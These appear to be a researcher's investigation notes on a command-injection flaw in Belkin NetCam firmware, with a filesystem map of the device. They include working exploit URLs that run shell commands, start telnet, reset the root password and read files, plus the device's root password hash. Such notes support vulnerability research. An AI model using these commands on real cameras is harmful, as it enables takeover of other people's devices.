# Investigating the vulnerability on a slightly newer Belkin NetCam Model.

Based off the following Exploit - https://www.exploit-db.com/exploits/42331

Exploit Title: Belkin NetCam F7D7601 | Remote Command Execution

Date: 17/07/17

Exploit Author: Wadeek


Was able to confirm the exploit works on the following build.

2.4.7.2

50HZ-FR-NetCam

13:30:33--Jul 8 2016



# Commands used for investigation

http://[ip]/goform/SystemCommand?command=ls%20-al%20/bin/busybox|logger

http://[ip]/goform/SystemCommand?command=cat%20/bin/busybox|logger

^with different parts and commands, you can use 'logger' to pass console reply to http://[ip]/goform/syslog


# Steps taken using the RCE:

  :Started telnet on port 23

http://[ip]/goform/SystemCommand?command=telnetd%20-p%2023%20-b%20[ip]|logger

  :Reset admin password

http://[ip]/goform/SystemCommand?command=echo%20"root:toor"%20|%20chpasswd|logger


# Directories, investigated web app permissions.


/

sys ----- Nope
sbin - 'All the Scripts!!!!'
tmp - 'Belkin XML Settings files'
etc_ro
home
lib - 'Libraries and modules'
usr
etc
dev
media
bin
proc
init -> bin/busybox - 'busybox binary'
mnt
var
record.txt

/etc

mdev.conf
Wireless
hosts
udhcpd.conf
udhcpd.conf_bak
group -> /etc_ro/group
passwd -> /etc_ro/passwd
passwd- -> /etc_ro/passwd-
certs -> /sbin/cacerts
resolv.conf
TZ


/tmp/Belkin_settings

jardenservice.xml
insightservice.xml
firmwareupdate.xml
deviceinfoservice.xml
metainfoservice.xml
rulesservice.xml
deviceinfoservice_v2.xml
timesyncservice.xml
setupservice.xml
smartsetup_v2.xml
setup.xml
remoteaccess.xml
icon.jpg
manufacture.xml
ManufactureData.xml
eventservice.xml
smartsetup.xml

/etc_ro

passwd - 'Root Password'
key.pub 
rcS - 'init shell script'
l7-protocols - 'Old .pat rule files'
group
inittab - 'adds a root shell to serial? then runs the rcS init script'
usb - 'nothing'
wlan - 'RT5350_AP_1T1R_V0_0.bin'
radvd.conf - 'some interface settings'
Wireless 
web
passwd- - 'Root Password'
linuxigd - 'upnp config'
ftpscheck.txt - 'nothing'
dnsmasq.d
Trust.crt
ppp
motd
xml

etc_ro/web

index.asp - 'Literally nothing'
dtree - 'this has a really useful directory tree application written in JS'
ralink - 'MAIN APP'
apcam - 'MAIN APP'
style - 'CSS... normal_ws.css'
horg.asp - 'sames as holast but uses ralink\treeapp and ralink\overview'
graphics
lang - 'a translation script written in JS (Butterlate)' 
cgi-bin - 'Some functions for backup, upload and history'
js - 'Has objects for word replacement based on language'
holast.asp - 'a sub-main script, does languages and invokes FW upgrade and view apcam/treeappname'


/etc_ro/web/ralink

opmode.asp - 'provides a web interface to change modes (AP,Client,Ethernet) - it calls /goform/setOpMode'
wireless 
home.asp
adm
treeapp.asp
internet
overview.asp

/etc_ro/web/apcam

for-android - 'Direct accessible ASP pages for device setup'
opmode.asp
wireless
apple
adm
apcam
treeapp.asp
iphone.asp
internet
for-iphone - 'Direct accessible ASP pages for device setup'
treeapp-nosc.asp
jqtouch
overview.asp

/etc_ro/web/apcam/for-android and for-iphone {ALL ACCESSIBLE} 'OPEN when in config mode'

CamPreview.asp
login.asp
CamRegister.asp
finish.asp
aplist.asp
VerifyMode.asp
CreateAccount.asp

/etc_ro/web/apcam/adm

upload_firmware.asp - 'OPEN when in config mode'
management.asp - 'OPEN when in config mode'
statistic.asp
system_command.asp - 'OPEN when in config mode'
syslog.asp
settings.asp
status.asp
wizard.asp

/etc_ro/passwd

root:Xkz1jZQvfHIkE:0:0:root:/:/bin/sh

/etc_ro/key.pub

-----BEGIN PUBLIC KEY-----^M
EXRACT YOUR OWN :P
-----END PUBLIC KEY-----^M

/etc_ro/group

root::0:root,admin
